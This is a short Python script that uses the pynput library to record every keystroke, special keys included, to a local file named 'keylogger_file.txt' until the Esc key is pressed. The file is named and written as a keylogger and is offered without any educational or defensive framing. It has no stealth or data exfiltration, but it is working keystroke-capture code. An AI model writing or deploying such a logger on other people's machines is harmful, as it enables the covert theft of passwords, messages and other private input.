from pynput import keyboard

LOG_FILE = "keylogger_file.txt"

def on_press(key):
    try:
        text = f"{key.char}"
    except AttributeError:
        skey = f"{key}"
        if "Key." in skey:
            text = f"<{skey.replace('Key.', '')}> "
        else:
            text = f"<{skey}> "


    with open(LOG_FILE, "a") as f:
        f.write(text)

def on_release(key):
    if key == keyboard.Key.esc:  
        return False  

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()
